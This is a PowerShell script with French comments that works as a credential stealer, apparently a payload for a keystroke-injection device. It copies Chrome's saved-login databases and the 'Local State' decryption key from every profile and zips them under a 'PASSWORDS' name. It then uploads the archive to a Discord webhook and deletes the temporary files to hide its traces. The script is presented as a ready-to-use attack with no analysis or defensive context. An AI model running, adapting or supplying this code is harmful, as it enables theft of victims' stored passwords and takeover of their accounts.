$hookurl = "$dc"
function Send-Discord {
    [CmdletBinding()]
    param(
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

$FolderName = "$env:USERNAME-PASSWORDS-$(Get-Date -f yyyy-MM-dd_hh-mm)"
$ZIP = "$FolderName.zip"
$DestinationPath = "$env:TEMP/$FolderName"
New-Item -Path $DestinationPath -ItemType Directory

# Récupère les informations de connexion pour le profil par défaut
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\LoginData_0"
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\LocalState"

# Récupère les informations de connexion pour chaque profil "Profile*"
$profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
$index = 1
foreach ($profile in $profiles) {
    $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
    if (Test-Path $loginDataPath) {
        Copy-Item $loginDataPath -Destination "$DestinationPath\LoginData_$index"
        $index++
    }
}

# Compresse le dossier contenant les données
Compress-Archive -Path $DestinationPath -DestinationPath "$env:TEMP/$ZIP"

# Envoie le fichier ZIP
Send-Discord -file "$env:TEMP/$ZIP"

# Nettoie les fichiers temporaires
Remove-Item "$env:TEMP/$ZIP"
Remove-Item -Recurse -Force $DestinationPath
